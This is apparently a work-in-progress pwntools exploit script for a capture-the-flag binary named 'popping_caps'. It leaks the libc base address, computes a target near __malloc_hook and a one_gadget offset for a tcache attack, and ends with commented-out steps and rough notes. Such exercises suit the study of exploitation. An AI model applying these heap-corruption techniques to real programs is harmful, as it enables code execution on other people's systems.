#!/usr/bin/env python3

from pwn import *

exe = ELF("./popping_caps")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def malloc(size):
    	r.sendline("1")
    	r.sendline(str(size))

    def free(idx):
    	r.sendline("2")
    	r.sendline(str(idx))

    def write(data):
    	r.sendline("3")
    	r.send(data)


    # libc leak
    r.recvuntil("Here is system 0x")
    leak = int(r.recvn(12), 16)
    libc.address = leak - libc.symbols['system']
    log.info("libc base: {}".format(hex(libc.address)))
    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 

    # tcache attack
    return_2hook = libc.symbols['__malloc_hook'] - 0x23 + 0x10
    one_gadget = libc.address + 0x10a38c

    #malloc(0x20)
    #free(0)
    free(return_2hook)
    
    r.interactive()


if __name__ == "__main__":
    main()
'''
2 pointers to last allocated chunk on the stack - modify caps?
free arbitrary

malloc(0x38) in bye
'''